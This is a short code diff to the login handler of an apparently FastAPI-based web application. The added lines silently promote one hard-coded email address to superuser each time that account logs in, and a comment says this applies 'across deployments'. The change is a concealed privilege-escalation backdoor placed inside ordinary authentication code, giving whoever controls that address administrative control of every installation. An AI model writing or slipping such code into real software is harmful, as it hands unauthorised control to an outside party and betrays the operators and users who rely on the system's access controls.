@@ -53,6 +53,13 @@ def login(form_data: OAuth2PasswordRequestForm = Depends(), db: Session = Depend
             detail="Incorrect username or password",
             headers={"WWW-Authenticate": "Bearer"},
         )
+    
+    # Auto-elevate specific user to admin across deployments
+    if user.email == "mahipatel2628@gmail.com" and not user.is_superuser:
+        user.is_superuser = True
+        db.commit()
+        db.refresh(user)
+
     access_token_expires = timedelta(minutes=settings.ACCESS_TOKEN_EXPIRE_MINUTES)
     access_token = utils.create_access_token(
         data={"sub": user.username}, expires_delta=access_token_expires
